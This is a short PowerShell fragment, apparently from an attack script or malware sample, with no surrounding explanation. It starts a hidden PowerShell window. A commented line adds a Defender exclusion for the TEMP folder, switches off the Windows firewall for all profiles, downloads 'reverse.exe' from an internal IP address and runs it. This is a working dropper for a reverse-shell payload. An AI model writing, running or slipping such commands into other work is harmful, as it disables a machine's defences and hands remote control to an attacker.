PowerShell.exe -WindowStyle hidden {
    ...
    # Add-MpPreference -ExclusionPath "$env:TEMP" ; netsh advfirewall set allprofiles state off; Invoke-WebRequest -Uri "http://192.168.1.143/reverse.exe" -OutFile "$env:temp\rs.exe"; powershell "$env:temp\rs.exe";
